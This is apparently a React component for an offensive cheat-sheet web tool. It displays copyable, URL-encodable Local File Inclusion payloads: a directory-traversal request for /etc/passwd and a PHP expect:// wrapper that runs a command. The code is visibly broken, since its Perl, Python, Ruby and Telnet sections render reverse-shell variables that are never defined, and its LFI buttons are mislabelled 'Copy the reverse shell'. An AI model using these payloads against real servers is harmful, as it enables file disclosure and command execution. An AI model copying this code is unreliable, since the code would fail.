import React from "react";
import { Button, message, Typography, Divider } from "antd";
import {
  CopyOutlined,
  LinkOutlined,
  createFromIconfontCN,
} from "@ant-design/icons";
import QueueAnim from "rc-queue-anim";
import Clipboard from "react-clipboard.js";

const { Title, Paragraph } = Typography;
const IconFont = createFromIconfontCN({
  scriptUrl: ["./iconfont.js"],
});

export default (props) => {
  const successInfoReverseShell = () => {
    message.success("Your LFI payload has been copied");
  };
  const successInfoEncodeURL = () => {
    message.success("Your LFI payload URL encoded has been copied");
  };
  const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
  const phpWrapper = `/example1.php?page=expect://ls`;
  return (
    <QueueAnim delay={300} duration={1500}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        LFI
      </Title>
      <Paragraph style={{ margin: 15 }}>
        LFI stands for Local File Includes - it’s a file local inclusion
        vulnerability that allows an attacker to include files that exist on the
        target web server.
      </Paragraph>
      <Paragraph>
        Typically this is exploited by abusing dynamic file inclusion mechanisms
        that don’t sanitize user input.
      </Paragraph>
      <Divider dashed />
      <div style={{ padding: 10, marginTop: 15 }} key='a'>
        <Title level={3}>Directory traversal</Title>
        <Paragraph copyable ellipsis={true}>
          {directoryTraversal}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={directoryTraversal}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined /> Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard
          component='a'
          data-clipboard-text={encodeURI(directoryTraversal)}
        >
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='b'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>PHP Wrapper expect:// LFI</Title>
        <Paragraph copyable ellipsis={true}>
          {phpWrapper}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={phpWrapper}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(phpWrapper)}>
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='c'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Perl <IconFont type='icon-perl' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {perl_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={perl_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(perl_rshell)}>
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='d'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Python <IconFont type='icon-python' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {" "}
          {python_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={python_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(python_rshell)}>
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='e'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Ruby <IconFont type='icon-ruby' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {ruby_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={ruby_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(ruby_rshell)}>
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div style={{ padding: 15, marginTop: 15 }} key='f'>
        <Title level={3}>
          Telnet <IconFont type='icon-lvzhou_yuanchengTelnet' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {telnet_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={telnet_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(telnet_rshell)}>
          <Button
            type='dashed'
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
    </QueueAnim>
  );
};
